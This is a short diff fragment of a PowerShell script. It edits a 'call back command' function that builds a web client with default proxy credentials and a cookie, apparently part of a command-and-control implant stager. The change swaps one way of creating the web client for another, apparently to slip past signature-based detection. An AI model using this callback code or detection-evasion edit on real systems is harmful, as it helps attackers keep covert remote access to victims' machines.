@@ -910,7 +910,7 @@ else
     write-host ""
     # call back command
     $command = 'function Get-Webclient ($Cookie) {
-    $wc = New-Object System.Net.WebClient; 
+    $wc = ([net.webclient]::new()); 
     $wc.UseDefaultCredentials = $true; 
     $wc.Proxy.Credentials = $wc.Credentials;
     if ($cookie) {
